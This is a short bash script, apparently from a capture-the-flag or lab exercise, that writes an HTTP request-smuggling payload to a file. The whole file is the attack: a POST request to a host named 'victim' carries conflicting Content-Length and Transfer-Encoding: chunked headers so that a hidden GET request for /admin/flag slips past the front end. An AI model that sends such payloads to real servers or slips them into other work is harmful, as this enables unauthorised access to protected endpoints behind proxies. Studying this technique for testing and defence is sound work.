#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'PY'
import os
open(os.path.join(os.environ['OUT_DIR'],'request.txt'),'wb').write(b'POST /submit HTTP/1.1\r\nHost: victim\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/flag HTTP/1.1\r\nHost: victim\r\n\r\n')
PY
